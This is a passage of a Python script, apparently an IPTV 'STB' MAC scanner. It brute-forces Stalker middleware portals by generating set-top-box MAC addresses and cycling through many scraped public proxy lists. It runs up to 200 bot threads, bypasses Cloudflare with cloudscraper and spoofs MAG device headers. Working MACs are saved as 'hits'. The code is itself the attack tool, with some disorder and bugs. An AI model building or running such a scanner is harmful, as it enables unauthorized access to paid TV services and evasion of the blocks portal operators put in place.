            if typeproxies == "2" or typeproxies == "3":
                hturl6 = "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"
                htp6 = requests.get(hturl6, headers=headersx)
                r6 = htp6.text
                e6 = open(FileHP, "a+")
                vu6 = e6.write(r6 + "\n")
                e5.close()
                hturl7 = "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt"
                htp7 = requests.get(hturl7, headers=headersx)
                r7 = htp7.text
                e7 = open(FileHP, "a+")
                vu7 = e7.write(r7 + "\n")
                e7.close()
                if typeproxies == "3":
                    hturl8 = "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt"
                    htp8 = requests.get(hturl8, headers=headersx)
                    r8 = htp8.text
                    e8 = open(FileHP, "a+")
                    vu8 = e8.write(r8 + "\n")
                    e8.close()
                    hturl9 = "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt"
                    htp9 = requests.get(hturl9, headers=headersx)
                    r9 = htp9.text
                    e9 = open(FileHP, "a+")
                    vu9 = e9.write(r9 + "\n")
                    e9.close()
            with open(FileHP) as reader, open(FileHP, "r+") as writer:
                for line in reader:
                    if line.strip():
                        writer.write(line)
                writer.truncate()
            ProxiesON = FileHP
            print(ProxiesON)
            print("HEHEHEHEHEHEHEHEHEHEHEHEHEH")
        if typeproxies == "4" or typeproxies == "5" or typeproxies == "6":
            protocol = 4
            mtype = "Socks4"
            fdata = "Automatic-Onine-Socks4"
            print(f"\n\x1b[33m   Please wait a few seconds!\n    Loading Proxy...{mtype}  \x1b[0m")
            s4url1 = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=Socks4&timeout=10000&country=all&ssl=all&anonymity=elite"
            s4u1 = requests.get(s4url1, headers=headersx)
            s4r1 = s4u1.text
            s4e1 = open(FileS4, "w+", encoding="utf-8-sig")
            s4v1 = s4e1.write(s4r1 + "\n")
            s4e1.close()
            s4url2 = "https://www.proxy-list.download/api/v1/get?type=socks4&anon=elite"
            s4u2 = requests.get(s4url2, headers=headersx)
            s4r2 = s4u2.text
            s4e2 = open(FileS4, "a+")
            s4v2 = s4e2.write(s4r2 + "\n")
            s4e2.close()
            if typeproxies == "5" or typeproxies == "6":
                s4url3 = "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt"
                s4u3 = requests.get(s4url3, headers=headersx)
                s4r3 = s4u3.text
                s4e3 = open(FileS4, "a+")
                s4v3 = s4e3.write(s4r3 + "\n")
                s4e3.close()
                s4url4 = (
                    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt"
                )
                s4u4 = requests.get(s4url4, headers=headersx)
                s4r4 = s4u4.text
                s4e4 = open(FileS4, "a+")
                s4v4 = s4e4.write(s4r4 + "\n")
                s4e4.close()
                if typeproxies == "6":
                    s4url5 = "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt"
                    s4u5 = requests.get(s4url5, headers=headersx)
                    s4r5 = s4u5.text
                    s4e5 = open(FileS4, "a+")
                    s4v5 = s4e5.write(s4r5 + "\n")
                    s4e5.close()
                    s4url6 = "https://raw.githubusercontent.com/almroot/proxylist/master/list.txt"
                    s4u6 = requests.get(s4url6, headers=headersx)
                    s4r6 = s4u6.text
                    s4e6 = open(FileS4, "a+")
                    s4v6 = s4e6.write(s4r6 + "\n")
                    s4e6.close()
                    s4url7 = "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt"
                    s4u7 = requests.get(s4url7, headers=headersx)
                    s4r7 = s4u7.text
                    s4e7 = open(FileS4, "a+")
                    s4v7 = s4e7.write(s4r7)
                    s4e7.close()
                    s4url8 = "https://sunny9577.github.io/proxy-scraper/proxies.txt"
                    s4u8 = requests.get(s4url8, headers=headersx)
                    s4r8 = s4u8.text
                    s4e8 = open(FileS4, "a+")
                    s4v8 = s4e8.write(s4r8 + "\n")
                    s4e8.close()
            with open(FileS4) as reader, open(FileS4, "r+") as writer:
                for line in reader:
                    if line.strip():
                        writer.write(line)
                writer.truncate()
            ProxiesON = FileS4
        if typeproxies == "7" or typeproxies == "8" or typeproxies == "9":
            protocol = 5
            mtype = "Socks5"
            fdata = "Automatic-Onine-Socks5"
            print(f"\n\x1b[33m   Please wait a few seconds!\n    Loading Proxy...{mtype}  \x1b[0m")
            s5url1 = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=elite"
            s5u1 = requests.get(s5url1, headers=headersx)
            s5r1 = s5u1.text
            s5e1 = open(FileS5, "w+", encoding="utf-8-sig")
            s5v1 = s5e1.write(s5r1 + "\n")
            s5e1.close()
            s5url2 = "https://www.proxy-list.download/api/v1/get?type=socks5&anon=elite"
            s5u2 = requests.get(s5url2, headers=headersx)
            s5r2 = s5u2.text
            s5e2 = open(FileS5, "a+")
            s5v2 = s5e2.write(s5r2 + "\n")
            s5e2.close()
            s5url3 = "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt"
            s5u3 = requests.get(s5url3, headers=headersx)
            s5r3 = s5u3.text
            s5e3 = open(FileS5, "a+")
            s5v3 = s5e3.write(s5r3 + "\n")
            s5e3.close()
            if typeproxies == "8" or typeproxies == "9":
                s5url4 = (
                    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt"
                )
                s5u4 = requests.get(s5url4, headers=headersx)
                s5r4 = s5u4.text
                s5e4 = open(FileS5, "a+")
                s5v4 = s5e4.write(s5r4 + "\n")
                s5e4.close()
                s5url5 = "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt"
                s5u5 = requests.get(s5url5, headers=headersx)
                s5r5 = s5u5.text
                s5e5 = open(FileS5, "a+")
                s5v5 = s5e5.write(s5r5 + "\n")
                s5e5.close()
                s5url6 = "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt"
                s5u6 = requests.get(s5url6, headers=headersx)
                s5r6 = s5u6.text
                s5e6 = open(FileS5, "a+")
                s5v6 = s5e6.write(s5r6 + "\n")
                s5e6.close()
                if typeproxies == "9":
                    s5url7 = "https://raw.githubusercontent.com//sunny9577/proxy-scraper/master/proxies.txt"
                    s5u7 = requests.get(s5url7, headers=headersx)
                    s5r7 = s5u7.text
                    s5e7 = open(FileS5, "a+")
                    s5v7 = s5e7.write(s5r7 + "\n")
                    s5e7.close()
                    s5url8 = "https://raw.githubusercontent.com/almroot/proxylist/master/list.txt"
                    s5u8 = requests.get(s5url8, headers=headersx)
                    s5r8 = s5u8.text
                    s5e8 = open(FileS5, "a+")
                    s5v8 = s5e8.write(s5r8 + "\n")
                    s5e8.close()
                    s5url9 = "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt"
                    s5u9 = requests.get(s5url9, headers=headersx)
                    s5r9 = s5u9.text
                    s5e9 = open(FileS5, "a+")
                    s5v9 = s5e9.write(s5r9 + "\n")
                    s5e9.close()
            with open(FileS5) as reader, open(FileS5, "r+") as writer:
                for line in reader:
                    if line.strip():
                        writer.write(line)
                writer.truncate()
            ProxiesON = FileS5
    except:
        pass
    say = 0
    ProxFile = fdata
    print(ProxiesON)
    print(ProxFile)
    if os.path.exists(ProxiesON):
        listf = open(ProxiesON).readlines()
        proxyf = [i for i in listf if i]
        proxyslen = len(proxyf)
        print(
            """
[33m      ♻️  ALL DONE  ♻️  [0m"""
        )
        time.sleep(1.5)
        os.remove(ProxiesON)
    else:
        print(
            """
[33m   ERROR: Downloading Proxies![0m"""
        )
        os.remove(ProxiesON)
        quit()
import urllib3
import os


def temizle():
    os.system("clear")


yeninesil = (
    "00:1A:79:",
    "00:1B:79:",
    "00:1C:19:",
    "00:1C:79:",
    "00:2A:79:",
    "00:A1:79:",
    "04:D6:AA:",
    "10:27:BE:",
    "11:22:00:",
    "11:33:01:",
    "1A:00:6A:",
    "1A:00:FB:",
    "32:2D:D1:",
    "33:44:CF:",
    "55:93:EA:",
    "A0:BB:3E:",
    "AA:88:99:",
    "AC:00:1A:",
    "D4:CF:F9:",
    "FF:1A:79:",
)
comboc = ""
combototLen = ""
combouz = 0
combodosya = "ᴀᴜᴛᴏ ʀᴀɴᴅᴏᴍ ᴍᴀᴄs"


def dosyasec():
    global comboc, combototLen, combodosya, combouz, randomturu, serim, seri, mactur, randommu
    say = 0
    dsy = ""

    if comboc == "":
        print(Rimic)
        mesaj = "Select mac combo!"
        dir = rootDir + "/ALBSTB/Combo/"
        dsy = " \33[91m0\033[1;32m = STB5࠾RandomCombo [SLXXL] \33[0m\n   \x1b[38;5;226m [OFFLINE-COMBO]\33[0m\n"
    else:
        # clear()
        print(Rimic)
    if not os.path.exists(dir):
        os.mkdir(dir)
    for files in os.listdir(dir):
        say = say + 1
        dsy = dsy + " \33[91m" + str(say) + " \033[1;32m= \33[0m\33[36m" + files + "\33[0m\n"
    print(
        """
Choose option from the list below!

"""
        + dsy
        + """
\x1b[38;5;226mFound """
        + str(say)
        + """.txt proxy files. \33[0m
"""
    )
    dsyno = str(input("    \x1b[38;5;1m\33[1mAɴꜱᴡᴇʀ =\33[1m\x1b[38;5;231m "))
    if dsyno == "":
        dsyno = "0"
    say = 0
    for files in os.listdir(dir):
        say = say + 1
        if dsyno == str(say):
            dosya = dir + files
            break
    clear()
    print(Rimic)
    say = 0
    try:
        if not dosya == "9797979790797977979":
            print()
        else:
            print("Incorrect file selection!")
            quit()
    except:
        print("\n\33[1m\x1b[38;5;231m  Select mac type!\n")
        if comboc == "":
            if dsyno == "0" or dsyno == "":
                nnesil = str(yeninesil)
                nnesil = nnesil.count(",") + 1
                for xd in range(0, (nnesil)):
                    tire = " ➭ "
                    if int(xd) < 9:
                        tire = "  ➭ "
                    print(
                        " \x1b[38;5;1m\33[1m"
                        + str(xd + 1)
                        + "\033[1;32m\33[1m"
                        + tire
                        + "\33[36m\33[1m"
                        + yeninesil[xd]
                    )
                mactur = input("\n    \x1b[38;5;1m\33[1mAɴꜱᴡᴇʀ =\33[1m\x1b[38;5;231m ")
                print("\033[H\033[J", end="")
                clear()
                print(Rimic)
                if mactur == "":
                    mactur = 1
                randomturu = input(
                    """
   \33[1m\x1b[38;5;231m Select mac combination type! \33[0m
					
\33[36m\33[1m    1 = Cascading mac
    2 = Random mac \033
   
    \x1b[38;5;1m\33[1mAɴꜱᴡᴇʀ =\33[1m\x1b[38;5;231m """
                )
                print("\033[H\033[J", end="")
                clear()
                print(Rimic)
                if randomturu == "":
                    randomturu = "2"
                serim = ""
                serim = input(
                    """
   \33[1m\x1b[38;5;231m Use serial mac? \33[0m					
\33[36m\33[1m    1 - YES
    2 - NO \033
    \x1b[38;5;1m\33[1mAɴꜱᴡᴇʀ =\33[1m\x1b[38;5;231m  """
                )
                print("\033[H\033[J", end="")
                clear()
                print(Rimic)
                mactur = yeninesil[int(mactur) - 1]
                if serim == "":
                    serim = 2
                if serim == "1":
                    seri = input(
                        "\n\n\x1b[38;5;226m\33[1m   Sample \033[1;32m\33[1m= \33[36m\33[1m"
                        + mactur
                        + "\33[91m5\x1b[38;5;226m\33[1m\n\n   Sample \033[1;32m\33[1m= \33[36m\33[1m"
                        + mactur
                        + "\33[91mFA\33[0m\n\n\x1b[38;5;1m\33[1m   Write one or two values!\33[0m\n\n   \33[36m\33[1m"
                        + mactur
                        + "\33[91m"
                    )
                    print("\033[H\033[J", end="")
                    # clear()
                    print(Rimic)
                combouz = input(
                    """
				
   \33[1m\x1b[38;5;231m Enter number of mac to scan! \33[0m

    \x1b[38;5;226mᴅᴇꜰᴀᴜʟᴛ Mᴀᴄꜱ = 999999


    \x1b[38;5;1m\33[1mAɴꜱᴡᴇʀ =\33[1m\x1b[38;5;231m """
                )
                if combouz == "":
                    combouz = 999999
                combouz = int(combouz)
                randommu = "fero"
        else:
            print("Wrong file selection!")
            quit()
    if comboc == "":
        if randommu == "":
            combodosya = dosya.replace(rootDir + "/ALBSTB/Combo/", "")
            combodosya = combodosya.replace(".txt", "")
            comboc = open(dosya, "r")
            combototLen = comboc.readlines()
            combouz = len(combototLen)
        else:
            comboc = "fero"


randommu = ""
dosyasec()
stbx = Faker()
panel = panel.replace("/c/", "")
expf = ""
login = ""
password = ""
stb_type = ""
play_token = ""
max_online = ""
expire_date = ""
client_type = ""
def_timezone = ""
a = "0123456789ABCDEF"
end = """ 

"""
STBx2 = """

"""
STBx3 = """ 

"""
STBx4 = """


"""
STBxB = """
"""
if proxi == "1":
    clear()
    print(Rimi)
    while True:
        STBbots = input(
            """    [1;96mMULTI-BOT[0m
   [92m[ᴘʀᴏxʏ=("""
            + str(proxyslen)
            + """)ᴏɴ][0m
   
   [1;33mCʜᴏᴏsᴇ ғʀᴏᴍ 1 ᴛᴏ 200 ɴᴜᴍʙᴇʀ ᴏғ Bᴏᴛs![0m
   
   [33mᴅᴇғᴀᴜʟᴛ ʙᴏᴛs = 50 [0m
   
   [36mAɴsᴡᴇʀ = [0m[0m[0m """
        )
        if STBbots == "":
            STBbots = int(50)
        STBbots = int(STBbots)
        if STBbots <= 200:
            break
else:
    clear()
    print(Rimi)
    while True:
        STBbots = input(
            """    [1;96mMULTI-BOT[0m
   [90m[ᴘʀᴏxʏ = ᴏғғ]![0m
   
   [1;33mCʜᴏᴏsᴇ ғʀᴏᴍ 1 ᴛᴏ 60 ɴᴜᴍʙᴇʀ ᴏғ Bᴏᴛs![0m
   
   [33mᴅᴇғᴀᴜʟᴛ ʙᴏᴛs = 20 [0m
   
   [36mAɴsᴡᴇʀ = [0m[0m[0m """
        )
        if STBbots == "":
            STBbots = int(20)
        STBbots = int(STBbots)
        if STBbots <= 60:
            break
clear()
print(Rimi)
m3ushort = input(
    """   [1;96mWhich M3U link you want? [0m
   
   1 [32m= [0m[33mRᴇᴀʟ URL (M3U) [0m
   2 [32m= [0m[33mOɴʟʏ Sʜᴏʀᴛ M3U [0m
   
   [33mᴅᴇғᴀᴜʟᴛ = 1 [0m[36m
   
   [36mAɴsᴡᴇʀ = [0m[0m[0m"""
)
if not m3ushort == "2":
    m3ushort = "1"
clear()
print(Rimi)
facestb = input(
    """[0;1m   Select Appearance of Confing! [0m
   
   [33mᴅᴇғᴀᴜʟᴛ ɪs = 1 [0m
[36m
   1 = Normal STB5  [32m
     ╙[More Stable Hits]
[36m
   2 = Faster STB5  [94m
     ╙[Less Stable Hits]
[0m
[31m   Aɴsᴡᴇʀ = [0m[0m[0m"""
)
if not facestb == "2":
    facestb = "1"
if authorz == "":
    attack = "sᴛʙ-ᴍᴀx-ᴀᴛᴛᴀᴄᴋ"
    if authorz == "automatic":
        attack = attack
if proxi == "1":
    clear()
    print(STB)
    print("\x1b[93m             Please wait...  \x1b[0m ")
    print(
        """[96m    STBᴍᴀx checking Proxy and Portal! [0m 
"""
    )

    def proxe():
        if rotationlen == 0:
            rotationinfo = (
                "   \x1b[33mRᴏᴛᴀᴛɪᴏɴPʀᴏxʏ:\x1b[91m[OFF]\x1b[33m ᴀᴛᴛᴇᴍᴘᴛ:"
                + CYANa
                + "[OFF]  \x1b[0m\n"
            )
        else:
            rotationinfo = (
                "   \x1b[33mRᴏᴛᴀᴛɪᴏɴPʀᴏxʏ:\x1b[92m[ON]\x1b[33m ᴀᴛᴛᴇᴍᴘᴛ:"
                + CYANa
                + str(rotationlen)
                + " \x1b[33mʀᴏᴏᴛ:"
                + CYANa
                + str(prosay)
                + "\x1b[0m\n"
            )
        return rotationinfo

    time.sleep(3)
    proxy = requests.Session()
    option = proxy
    start = (
        "\n   \x1b[33mHᴇʟʟᴏ»\x1b[0m"
        + CYANa
        + str(nickn)
        + """ 👑   [0m
   [33mYᴏᴜ Cʜᴏsᴇ [91m"""
        + str(STBbots)
        + """ [33mBᴏᴛs [0m
   [33mSᴛʙAɢᴇɴᴛ:[91m"""
        + str(agentx)
        + """ [0m
   [33mSᴛʙAᴛᴛᴀᴄᴋ:[91m"""
        + str(attack)
        + """ [0m
   [33mᴘʜᴘTʏᴘᴇ:[91m"""
        + str(albstb3)
        + """ [0m
   [33mMᴀᴄs:[91m"""
        + str(combouz)
        + " \x1b[0m\x1b[33mɪɴ \x1b[91m"
        + combodosya
        + """ [0m
   [33mPʀᴏxʏ:[91m"""
        + str(proxyslen)
        + " \x1b[0m\x1b[33mɪɴ \x1b[91m"
        + str(ProxFile).replace(".txt", "")
        + "\x1b[0m"
        + str(infophpx)
        + ""
    )
else:
    clear()
    print(STB)
    print("\x1b[93m             Please wait...  \x1b[0m ")
    print(
        """[92m    STBᴍᴀx checking the Portal data!! [0m 
"""
    )
    time.sleep(1)
    if authorc == "cloudflarex" or ccff == "CloudFlare":
        try:
            import cloudscraper

            sesq = requests.session()
            option = cloudscraper.create_scraper(sess=sesq)
        except:
            import cfscrape

            sesq = requests.Session()
            option = cfscrape.create_scraper(sess=sesq)
    data = ""
    urlr = (
        http
        + "://"
        + panel
        + "/"
        + author
        + "?type=stb&action=handshake&token=&JsHttpRequest=1-xml"
    )
    bag1 = 0
    while True:
        try:
            res = option.get(urlr, headers=HEADERAb, timeout=7, verify=False)
            data = str(res.text)
            break
        except:
            bag1 = bag1 + 1
            time.sleep(1)
            if bag1 == 3:
                clear()
                print(STBx2)
                print(STBx3)
                print(
                    """
   -This Portal has blocked your IP/VPN!
   Or Portal maybe Offline at the moment!
   +TIP: Change your IP/VPN or use Proxy."""
                )
                print(STBxB)
                print("\n" + end)
                quit()
    start = (
        "\n   [33mHᴇʟʟᴏ» [0m"
        + CYANa
        + str(nickn)
        + """ 👑   [0m
   [33mYᴏᴜ Cʜᴏsᴇ [91m"""
        + str(STBbots)
        + """ [33mBᴏᴛs [0m
   [33mSᴛʙAɢᴇɴᴛ:[91m"""
        + str(agentx)
        + """ [0m
   [33mSᴛʙAᴛᴛᴀᴄᴋ:[91m"""
        + str(attack)
        + """ [0m
   [33mᴘʜᴘTʏᴘᴇ:[91m"""
        + str(albstb3)
        + """ [0m
   [33mMᴀᴄs:[91m"""
        + str(combouz)
        + " [0m[33mɪɴ [91m"
        + combodosya
        + " [0m"
        + str(infophpx)
        + "\n"
    )


def anima(px, bot):
    i = px
    animation = [
        "\x1b[36m●●●○○○○○○○○○○○○○○○○○○○\x1b[91m",
        "\x1b[36m●●●●●●●○○○○○○○○○○○○○○○\x1b[91m",
        "\x1b[36m●●●●●●●●●●●●●●●○○○○○○○\x1b[91m",
        "\x1b[36m●●●●●●●●●○○○○○○○○○○○○○\x1b[91m",
        "\x1b[36m●●●●●●●●●●●●●●○○○○○○○○\x1b[91m",
        "\x1b[36m●●●●●●●●●●○○○○○○○○○○○○\x1b[91m",
        "\x1b[36m●●●●●●●●●●●●○○○○○○○○○○\x1b[91m",
        "\x1b[36m●●●●●●●●●●●●●○○○○○○○○○\x1b[91m",
        "\x1b[36m●●●●●●●●●●●●●●●●●●●○○○\x1b[91m",
        "\x1b[36m●●●●●●●●●○○○○○○○○○○○○○\x1b[91m",
        "\x1b[36m●●●●●●●●●●○○○○○○○○○○○○\x1b[91m",
        "\x1b[36m●●●●●●●●●●●●●●●●●○○○○○\x1b[91m",
        "\x1b[36m●●●●●●●●○○○○○○○○○○○○○○\x1b[91m",
        "\x1b[36m●●●●●●●●●●●●○○○○○○○○○○\x1b[91m",
        "\x1b[36m●●●●●●●●●●●●●●●●●●●●●○\x1b[91m",
    ]
    sys.stdout.write(
        "\r   \x1b[92m♻️Pʀᴏxʏ\x1b[91m[" + animation[i % len(animation)] + "]\x1b[92mCʜᴇᴄᴋ \x1b[0m"
    )
    sys.stdout.flush()


def animc():
    global px
    px += 1
    if px == 20:
        px = 0
    animation = [
        "\x1b[0msᴛʙ 5 ᴘʀᴏ ᴘʀᴇᴍɪᴜᴍ sᴄᴀɴɴᴇʀ ʙʏ ᴀ_ᴘxʟʟ 🦅",
        "\x1b[0msᴛʙ 5 ᴘʀᴏ ᴘʀᴇᴍɪᴜᴍ sᴄᴀɴɴᴇʀ ʙʏ ᴀ_ᴘxʟʟ 🦅",
        "\x1b[0msᴛʙ 5 ᴘʀᴏ ᴘʀᴇᴍɪᴜᴍ sᴄᴀɴɴᴇʀ ʙʏ ᴀ_ᴘxʟʟ 🦅",
        " \x1b[90msᴛʙ 5 ᴘʀᴏ ᴘʀᴇᴍɪᴜᴍ sᴄᴀɴɴᴇʀ ʙʏ ᴀ_ᴘxʟʟ 🦅",
        " \x1b[91msᴛʙ 5 ᴘʀᴏ ᴘʀᴇᴍɪᴜᴍ sᴄᴀɴɴᴇʀ ʙʏ ᴀ_ᴘxʟʟ 🦅",
        " \x1b[92msᴛʙ 5 ᴘʀᴏ ᴘʀᴇᴍɪᴜᴍ sᴄᴀɴɴᴇʀ ʙʏ ᴀ_ᴘxʟʟ 🦅",
        " \x1b[93msᴛʙ 5 ᴘʀᴏ ᴘʀᴇᴍɪᴜᴍ sᴄᴀɴɴᴇʀ ʙʏ ᴀ_ᴘxʟʟ 🦅",
        " \x1b[94msᴛʙ 5 ᴘʀᴏ ᴘʀᴇᴍɪᴜᴍ sᴄᴀɴɴᴇʀ ʙʏ ᴀ_ᴘxʟʟ 🦅",
        " \x1b[95msᴛʙ 5 ᴘʀᴏ ᴘʀᴇᴍɪᴜᴍ sᴄᴀɴɴᴇʀ ʙʏ ᴀ_ᴘxʟʟ 🦅",
        " \x1b[96msᴛʙ 5 ᴘʀᴏ ᴘʀᴇᴍɪᴜᴍ sᴄᴀɴɴᴇʀ ʙʏ ᴀ_ᴘxʟʟ 🦅",
        " \x1b[97msᴛʙ 5 ᴘʀᴏ ᴘʀᴇᴍɪᴜᴍ sᴄᴀɴɴᴇʀ ʙʏ ᴀ_ᴘxʟʟ 🦅",
        " \x1b[90msᴛʙ 5 ᴘʀᴏ ᴘʀᴇᴍɪᴜᴍ sᴄᴀɴɴᴇʀ ʙʏ ᴀ_ᴘxʟʟ 🦅",
        " \x1b[91msᴛʙ 5 ᴘʀᴏ ᴘʀᴇᴍɪᴜᴍ sᴄᴀɴɴᴇʀ ʙʏ ᴀ_ᴘxʟʟ 🦅",
        " \x1b[92msᴛʙ 5 ᴘʀᴏ ᴘʀᴇᴍɪᴜᴍ sᴄᴀɴɴᴇʀ ʙʏ ᴀ_ᴘxʟʟ 🦅",
        " \x1b[93msᴛʙ 5 ᴘʀᴏ ᴘʀᴇᴍɪᴜᴍ sᴄᴀɴɴᴇʀ ʙʏ ᴀ_ᴘxʟʟ 🦅",
        " \x1b[94msᴛʙ 5 ᴘʀᴏ ᴘʀᴇᴍɪᴜᴍ sᴄᴀɴɴᴇʀ ʙʏ ᴀ_ᴘxʟʟ 🦅",
        " \x1b[95msᴛʙ 5 ᴘʀᴏ ᴘʀᴇᴍɪᴜᴍ sᴄᴀɴɴᴇʀ ʙʏ ᴀ_ᴘxʟʟ 🦅",
        " \x1b[96msᴛʙ 5 ᴘʀᴏ ᴘʀᴇᴍɪᴜᴍ sᴄᴀɴɴᴇʀ ʙʏ ᴀ_ᴘxʟʟ 🦅",
        " \x1b[97msᴛʙ 5 ᴘʀᴏ ᴘʀᴇᴍɪᴜᴍ sᴄᴀɴɴᴇʀ ʙʏ ᴀ_ᴘxʟʟ  🦅",
        " \x1b[93msᴛʙ 5 ᴘʀᴏ ᴘʀᴇᴍɪᴜᴍ sᴄᴀɴɴᴇʀ ʙʏ ᴀ_ᴘxʟʟ 🦅",
    ]
    sys.stdout.write("\r   🦂 " + animation[px % len(animation)] + " \x1b[0m")
    sys.stdout.flush()


px = 0
hitsay = 0


hits = rootDir + "/ALBSTB/"
if not os.path.exists(hits):
    os.mkdir(hits)
hitsay = 0
say = 1


def yax(hits):
    dosya = open(Dosyab, "a+", encoding="utf-8")
    dosya.write(hits)
    dosya.close()


import requests
import os, pip
import datetime, os
import socket, hashlib
import json, random, sys, time, re

try:
    import threading
except:
    pass
import pathlib

try:
    import flag
except:
    pip.main(["install", "emoji-country-flag"])
    import flag
option = requests.Session()
Dosyab = (
    rootDir
    + "/ALBSTB/Hits/FULL/STBᴍᴀx{"
    + panel.replace(":", "_").replace("/", "")
    + "}#"
    + str(nickn)
    + "{ʜɪᴛs}.txt"
)

DosyaC = (
    rootDir
    + "/ALBSTB/Hits/SHORT/STBᴍᴀx{"
    + panel.replace(":", "_").replace("/", "")
    + "}#"
    + str(nickn)
    + "{ʜɪᴛs}.txt"
)


def yak(hits):
    dosya = open(DosyaC, "a+", encoding="utf-8")
    dosya.write(hits)
    dosya.close()


combosay = 0

DosyaD = (
    rootDir
    + "/ALBSTB/Hits/MACs/STBᴍᴀx{"
    + panel.replace(":", "_").replace("/", "")
    + "}#"
    + str(nickn)
    + "{ʜɪᴛs}.txt"
)


def yaz(hits):
    dosya = open(DosyaD, "a+", encoding="utf-8")
    dosya.write(hits)
    dosya.close()


def month_to_number(month):
    m = {
        "jan": 1,
        "feb": 2,
        "mar": 3,
        "apr": 4,
        "may": 5,
        "jun": 6,
        "jul": 7,
        "aug": 8,
        "sep": 9,
        "oct": 10,
        "nov": 11,
        "dec": 12,
    }
    s = month.strip()[:3].lower()
    try:
        out = m[s]
        return out
    except:
        raise ValueError("Not a month")


def days(expire):
    month = ""
    days = ""
    year = ""
    eoy = ""
    final = ""
    try:
        if "," in expire:
            month = str(expire.split(" ")[0])
            days = str(expire.split(", ")[0].split(" ")[1])
            year = str(expire.split(", ")[1])
            month = str(month_to_number(month))
        if "-" in expire:
            if ":" in expire:
                expire = expire.split(" ")[0]
            year = str(expire.split("-")[0]).replace(" ", "")
            month = str(expire.split("-")[1]).replace(" ", "")
            days = str(expire.split("-")[-1]).replace(" ", "")
        tdy = date.today()
        eoy = date(int(year), int(month), int(days))
        final = (eoy - tdy).days
    except:
        pass
    return final


xcc = 0

if pano == "":
    panell = str(panel)
else:
    panell = str(panel) + pano
stop = 0


import re

pattern = "(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})"


k = 0
jj = 0
iii = 0
genmacs = ""
bib = 0
import random


def randommac():
    global genmacs, combosay
    combosay = combosay + 1
    global k, jj, iii
    if randomturu == "2":
        while True:
            genmac = str(mactur) + "%02x:%02x:%02x" % (
                (random.randint(0, 256)),
                (random.randint(0, 256)),
                (random.randint(0, 256)),
            )
            if not genmac in genmacs:
                genmacs = genmacs + " "
                break
    else:
        if iii >= 257:
            iii = 0
            jj = jj + 1
        if jj >= 257:
            if not len(seri) == 2:
                jj = 0
            k = k + 1
            if len(seri) == 2:
                quit()
        if k == 257:
            quit()
        genmac = str(mactur) + "%02x:%02x:%02x" % (k, jj, iii)
        iii = iii + 1
    if serim == "1":
        if len(seri) == 1:
            genmac = str(genmac).replace(str(genmac[:10]), str(mactur) + seri)
        if len(seri) == 2:
            genmac = str(genmac).replace(str(genmac[:11]), str(mactur) + seri)
    genmac = genmac.replace(":100", ":10")
    genmac = genmac.upper()
    return genmac


def randomproxy():
    global px, xcc, checkproxyend, selectprox
    proxys = ""
    px += 1
    if stop == 2:
        quit()
    try:
        if selectprox == proxyslen:
            if proxygoodlen == 0:
                xcc = 1
            secure_random = random.SystemRandom()
            proxys = secure_random.choice(proxygood)
            if checkproxyend == 0:
                checkproxyend = 1
        else:
            selectprox += 1
            proxys = proxyf[selectprox]
    except:
        pass
    return proxys


def month_string_to_number(ay):
    m = {
        "jan": 1,
        "feb": 2,
        "mar": 3,
        "apr": 4,
        "may": 5,
        "jun": 6,
        "jul": 7,
        "aug": 8,
        "sep": 9,
        "oct": 10,
        "nov": 11,
        "dec": 12,
    }
    s = ay.strip()[:3].lower()
    try:
        out = m[s]
        return out
    except:
        raise ValueError("Not a month")


from datetime import date


def tarih_clear(trh):
    ay = ""
    gun = ""
    yil = ""
    trai = ""
    my_date = ""
    sontrh = ""
    out = ""
    ay = str(trh.split(" ")[0])
    gun = str(trh.split(", ")[0].split(" ")[1])
    yil = str(trh.split(", ")[1])
    ay = str(month_string_to_number(ay))
    trai = str(gun) + "/" + str(ay) + "/" + str(yil)
    my_date = str(trai)
    d = date(int(yil), int(ay), int(gun))
    sontrh = time.mktime(d.timetuple())
    out = int((sontrh - time.time()) / 86400)
    return out


def hea1(mac):
    macs = mac.upper()  #
    macs = urllib.parse.quote(mac)  #
    singe = panel
    if "/" in singe:
        singe = singe.split("/")[0]
    if phhp == "17":
        HEADERA = {
            "User-Agent": useragent,
            "Referer": http + "://" + panell + "/c/",
            "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Cookie": "mac=" + macs + "; stb_lang=en; timezone=Europe%2FParis;",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "Keep-Alive",
            "X-User-Agent": "Model: MAG254; Link: Ethernet",
        }
    if authorc == "cloudflarex" or ccff == "CloudFlare":
        HEADERA = {
            "X-User-Agent": "Model: MAG250; Link: WiFi",
            "User-Agent": useragent,
            "Referer": http + "://" + panell + "/c/",
            "Accept": "application/json,application/javascript,text/javascript,text/javascript;charset=UTF-8,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Host": http + "://" + panel.replace("/stalker_portal", ""),
            "Cookie": "mac=" + macs + "; debug=1; stb_lang=en; timezone=Europe%2FParis;",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "Keep-Alive",
            "NEL": '{"success_fraction":0,"report_to":"cf-nel","max_age":604800}',
            "Pragma": "no-cache",
            "Server": "cloudflare",
            "x-proxy-cache": "MISS",
